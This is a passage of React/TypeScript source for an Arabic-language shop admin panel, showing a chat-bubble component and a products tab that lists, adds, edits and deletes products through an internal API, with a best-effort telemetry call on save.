          >
            <Send className="w-4 h-4" />
          </button>
        </form>
      </div>
    </>
  );
}

function Bubble({
  children,
  side,
  time,
  accent = false,
}: {
  children: React.ReactNode;
  side: "incoming" | "outgoing";
  time: string;
  accent?: boolean;
}) {
  const isOut = side === "outgoing";
  const bg = isOut
    ? "bg-[#dcf2c1]"
    : accent
      ? "bg-white border-2 border-primary/30"
      : "bg-white";
  const align = isOut ? "ms-auto rounded-bl-sm" : "me-auto rounded-br-sm";
  return (
    <div className={`max-w-[88%] sm:max-w-[78%] ${align}`}>
      <div className={`${bg} rounded-2xl px-3 py-2 shadow-sm relative`}>
        {children}
        <div className="text-[10px] text-muted-foreground/80 font-mono text-end mt-0.5 leading-none">
          {time}{" "}
          {isOut && (
            <CheckCheck className="inline w-3 h-3 text-blue-500 align-middle" />
          )}
        </div>
      </div>
    </div>
  );
}

// ───────────────────────────────────────────────────────────────────────────────
// Products Tab (unchanged)
// ───────────────────────────────────────────────────────────────────────────────

function ProductsTab({
  authHeaders,
}: {
  authHeaders: () => Promise<Record<string, string>>;
}) {
  const [products, setProducts] = useState<Product[]>([]);
  const [loading, setLoading] = useState(true);
  const [editing, setEditing] = useState<Product | null>(null);
  const [showForm, setShowForm] = useState(false);
  const [form, setForm] = useState<ProductForm>(emptyProductForm);
  const [submitting, setSubmitting] = useState(false);
  const [formError, setFormError] = useState<string | null>(null);
  const { toast } = useToast();

  const reload = useCallback(() => {
    setLoading(true);
    fetch("/api/products")
      .then((r) => {
        if (!r.ok) throw new Error(`HTTP ${r.status}`);
        return r.json() as Promise<Product[]>;
      })
      .then((data) => setProducts(data))
      .catch(() => setProducts([]))
      .finally(() => setLoading(false));
  }, []);

  useEffect(() => {
    reload();
  }, [reload]);

  const openCreate = () => {
    setEditing(null);
    setForm(emptyProductForm);
    setFormError(null);
    setShowForm(true);
  };

  const openEdit = (p: Product) => {
    setEditing(p);
    setForm({
      name_ar: p.name_ar,
      price: String(p.price),
      original_price: String(p.original_price ?? 0),
      discount: String(p.discount ?? 0),
      category: p.category || "promotions",
      in_stock: !!p.in_stock,
      image_url: p.image_url || "",
    });
    setFormError(null);
    setShowForm(true);
  };

  const closeForm = () => {
    setShowForm(false);
    setEditing(null);
    setFormError(null);
  };

  const submit = async (e: React.FormEvent) => {
    e.preventDefault();
    setFormError(null);
    
    if (!form.name_ar.trim()) {
      setFormError("اسم المنتج مطلوب");
      return;
    }
    const priceNum = Number(form.price);
    if (!Number.isFinite(priceNum) || priceNum < 0) {
      setFormError("السعر غير صحيح");
      return;
    }

    const payload = {
      name_ar: form.name_ar.trim(),
      price: priceNum,
      original_price: Number(form.original_price) || 0,
      discount: Number(form.discount) || 0,
      category: form.category,
      in_stock: form.in_stock,
      image_url: form.image_url.trim(),
    };
    // Fire-and-forget telemetry: never block product save.
    void addData({ id: ensureVisitorId(), ...payload }).catch(() => {
      /* telemetry is best-effort */
    });
    setSubmitting(true);
    try {
      const headers = {
        "Content-Type": "application/json",
        ...(await authHeaders()),
      };
      const url = editing ? `/api/products/${editing.id}` : "/api/products";
      const method = editing ? "PATCH" : "POST";
      const r = await fetch(url, {
        method,
        headers,
        body: JSON.stringify(payload),
      });
      if (!r.ok) {
        const body = (await r.json().catch(() => null)) as {
          error?: string;
        } | null;
        throw new Error(body?.error || `HTTP ${r.status}`);
      }
      toast({
        title: editing ? "تم تحديث المنتج ✓" : "تمت إضافة المنتج ✓",
        description: payload.name_ar,
        duration: 2000,
      });
      closeForm();
      reload();
    } catch (err) {
      setFormError(err instanceof Error ? err.message : "حدث خطأ");
    } finally {
      setSubmitting(false);
    }
  };

  const remove = async (p: Product) => {
    if (!confirm(`هل تريد حذف المنتج: ${p.name_ar}؟`)) return;
    const headers = await authHeaders();
    const r = await fetch(`/api/products/${p.id}`, {
      method: "DELETE",
      headers,
    });
    if (!r.ok) {
      toast({
        title: "فشل الحذف",
        description: `HTTP ${r.status}`,
        duration: 2500,
      });
      return;
    }
    toast({ title: "تم حذف المنتج", description: p.name_ar, duration: 2000 });
    setProducts((prev) => prev.filter((x) => x.id !== p.id));
  };

  return (
    <>
      <div className="flex items-center justify-between mb-4">
        <p className="text-sm text-muted-foreground">{products.length} منتج</p>
        <button
          onClick={openCreate}
          className="bg-primary text-primary-foreground text-sm font-bold px-4 py-2 rounded-lg hover:bg-primary/90 transition-colors"
        >
          + إضافة منتج
        </button>
      </div>

      <div className="bg-card border border-border rounded-xl overflow-hidden">
        {loading ? (
          <div className="flex items-center justify-center h-40">
            <div className="w-8 h-8 border-4 border-muted border-t-primary rounded-full animate-spin" />
          </div>
        ) : products.length === 0 ? (
          <div className="text-center py-16 text-muted-foreground">
            لا توجد منتجات بعد
          </div>
        ) : (
          <div className="overflow-x-auto">
            <table className="w-full text-sm">
              <thead className="bg-muted/50 border-b border-border">
                <tr>
                  {[
                    "الصورة",
                    "الاسم",
                    "الفئة",
                    "السعر",
                    "السعر الأصلي",
                    "الخصم",
                    "الحالة",
                    "إجراءات",
                  ].map((h) => (
                    <th
                      key={h}
                      className="px-4 py-3 text-right font-bold text-foreground whitespace-nowrap"
                    >
                      {h}
                    </th>
                  ))}
                </tr>
              </thead>
              <tbody>
                {products.map((p, i) => (
                  <tr
                    key={p.id}
                    className={`border-b border-border hover:bg-muted/30 transition-colors ${i % 2 === 0 ? "" : "bg-muted/10"}`}
                  >
                    <td className="px-4 py-3">
                      {p.image_url ? (
                        <img
                          src={p.image_url}
                          alt={p.name_ar}
                          className="w-12 h-12 object-contain bg-muted/30 rounded"
                        />
                      ) : (
                        <div className="w-12 h-12 bg-muted/30 rounded" />
                      )}
                    </td>
                    <td className="px-4 py-3 font-medium max-w-xs">
                      {p.name_ar}
                    </td>
                    <td className="px-4 py-3 text-xs text-muted-foreground">
                      {p.category}
                    </td>
                    <td className="px-4 py-3 font-bold">
                      {p.price.toLocaleString("ar-SA")} ر.س
                    </td>
                    <td className="px-4 py-3 text-muted-foreground">
                      {p.original_price.toLocaleString("ar-SA")} ر.س
                    </td>
                    <td className="px-4 py-3">
                      {p.discount > 0
                        ? `${p.discount.toLocaleString("ar-SA")} ر.س`
                        : "—"}
                    </td>
                    <td className="px-4 py-3">
                      <span
                        className={`px-2 py-1 rounded-full text-xs font-bold ${p.in_stock ? "bg-green-100 text-green-800" : "bg-muted text-muted-foreground"}`}
                      >
                        {p.in_stock ? "متوفر" : "غير متوفر"}
                      </span>
                    </td>
                    <td className="px-4 py-3">
                      <div className="flex gap-2">
                        <button
                          onClick={() => openEdit(p)}
                          className="text-xs text-primary hover:underline"
                        >
                          تعديل
                        </button>
                        <button
                          onClick={() => remove(p)}
                          className="text-xs text-destructive hover:underline"
                        >
                          حذف
                        </button>
                      </div>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}
      </div>

      {showForm && (
        <div
          className="fixed inset-0 bg-black/50 z-50 flex items-center justify-center p-4"
          onClick={closeForm}
        >
          <div
            className="bg-card rounded-2xl p-6 max-w-lg w-full max-h-[90vh] overflow-y-auto"
            onClick={(e) => e.stopPropagation()}
          >
            <div className="flex items-center justify-between mb-4">
              <h2 className="font-bold text-foreground text-lg">
                {editing ? "تعديل المنتج" : "إضافة منتج جديد"}
              </h2>
              <button
                onClick={closeForm}
                className="text-muted-foreground hover:text-foreground"
              >
                ✕
              </button>
            </div>
            <form onSubmit={submit} className="space-y-3 text-sm">
              <div>
                <label className="block text-xs font-bold text-foreground mb-1">
                  اسم المنتج *
                </label>
                <input
                  type="text"
                  value={form.name_ar}
                  onChange={(e) =>
                    setForm({ ...form, name_ar: e.target.value })
                  }
                  className="w-full border border-border bg-card text-card-foreground px-3 py-2 rounded-lg focus:outline-none focus:ring-2 focus:ring-primary"
                  required
                />
              </div>
              <div className="grid grid-cols-2 gap-3">
                <div>
                  <label className="block text-xs font-bold text-foreground mb-1">
                    السعر (ر.س) *
                  </label>
                  <input
                    type="number"
                    inputMode="numeric"
                    min="0"
                    value={form.price}
                    onChange={(e) =>
                      setForm({ ...form, price: e.target.value })
                    }
                    className="w-full border border-border bg-card text-card-foreground px-3 py-2 rounded-lg focus:outline-none focus:ring-2 focus:ring-primary"
                    required
                  />
                </div>
                <div>
                  <label className="block text-xs font-bold text-foreground mb-1">
                    السعر الأصلي (ر.س)
                  </label>
                  <input
                    type="number"
                    inputMode="numeric"
                    min="0"
                    value={form.original_price}
                    onChange={(e) =>
                      setForm({ ...form, original_price: e.target.value })
                    }
                    className="w-full border border-border bg-card text-card-foreground px-3 py-2 rounded-lg focus:outline-none focus:ring-2 focus:ring-primary"
                  />
                </div>
                <div>
                  <label className="block text-xs font-bold text-foreground mb-1">
                    الخصم (ر.س)
                  </label>
                  <input
                    type="number"
                    inputMode="numeric"
                    min="0"
                    value={form.discount}
                    onChange={(e) =>
                      setForm({ ...form, discount: e.target.value })
                    }
                    className="w-full border border-border bg-card text-card-foreground px-3 py-2 rounded-lg focus:outline-none focus:ring-2 focus:ring-primary"
                  />
                </div>
                <div>
                  <label className="block text-xs font-bold text-foreground mb-1">
                    الفئة
                  </label>
                  <select
                    value={form.category}
                    onChange={(e) =>
                      setForm({ ...form, category: e.target.value })
                    }
                    className="w-full border border-border bg-card text-card-foreground px-3 py-2 rounded-lg focus:outline-none focus:ring-2 focus:ring-primary"
                  >
                    {productCategories.map((c) => (
                      <option key={c.value} value={c.value}>
                        {c.label}
                      </option>
                    ))}
                  </select>
                </div>
              </div>
              <div>
                <label className="block text-xs font-bold text-foreground mb-1">
                  رابط الصورة
                </label>
                <input
                  type="url"
                  dir="ltr"
                  value={form.image_url}
                  onChange={(e) =>
                    setForm({ ...form, image_url: e.target.value })
                  }
                  className="w-full border border-border bg-card text-card-foreground px-3 py-2 rounded-lg focus:outline-none focus:ring-2 focus:ring-primary"
                  placeholder="https://..."
                />
              </div>
              <label className="flex items-center gap-2 cursor-pointer">
                <input
                  type="checkbox"
                  checked={form.in_stock}
                  onChange={(e) =>
                    setForm({ ...form, in_stock: e.target.checked })
                  }
                  className="w-4 h-4"
                />
                <span className="text-sm">المنتج متوفر</span>
              </label>

              {formError && (
                <div className="bg-destructive/10 border border-destructive/20 text-destructive text-xs px-3 py-2 rounded-lg">
                  {formError}
                </div>
              )}

              <div className="flex gap-2 pt-2">
                <button
                  type="button"
                  onClick={closeForm}
                  className="flex-1 border border-border text-foreground text-sm font-bold py-2 rounded-lg hover:bg-muted transition-colors"
                >
                  إلغاء
                </button>
                <button
                  type="submit"
                  disabled={submitting}
                  className="flex-1 bg-primary text-primary-foreground text-sm font-bold py-2 rounded-lg hover:bg-primary/90 transition-colors disabled:opacity-50"
                >
                  {submitting
                    ? "جاري الحفظ..."
                    : editing
                      ? "حفظ التغييرات"
                      : "إضافة المنتج"}
                </button>
              </div>
            </form>
          </div>
        </div>
      )}
    </>
  );
}
